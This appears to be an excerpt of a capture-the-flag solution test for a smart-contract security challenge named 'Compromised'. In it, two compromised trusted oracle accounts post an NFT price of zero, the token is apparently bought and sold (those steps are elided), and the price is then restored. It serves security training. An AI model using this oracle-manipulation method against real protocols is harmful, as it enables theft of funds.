...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    console.log("NFT price before attack: ", String(await oracle.getMedianPrice(tokenSymbol)).slice(0, -18))

    // Change its price to 0 using the oracles addresses
    await oracle.connect(trustedOracle1).postPrice(tokenSymbol, 0)
    await oracle.connect(trustedOracle2).postPrice(tokenSymbol, 0)

    console.log("NFT price when buying: ", String(await oracle.getMedianPrice(tokenSymbol)))
    ...
    console.log("NFT price when selling: ", String(await oracle.getMedianPrice(tokenSymbol)).slice(0, -18))
    ...
    await oracle.connect(trustedOracle1).postPrice(tokenSymbol, INITIAL_NFT_PRICE)
    await oracle.connect(trustedOracle2).postPrice(tokenSymbol, INITIAL_NFT_PRICE)

    console.log("NFT price after attack: ", String(await oracle.getMedianPrice(tokenSymbol)).slice(0, -18))
  })
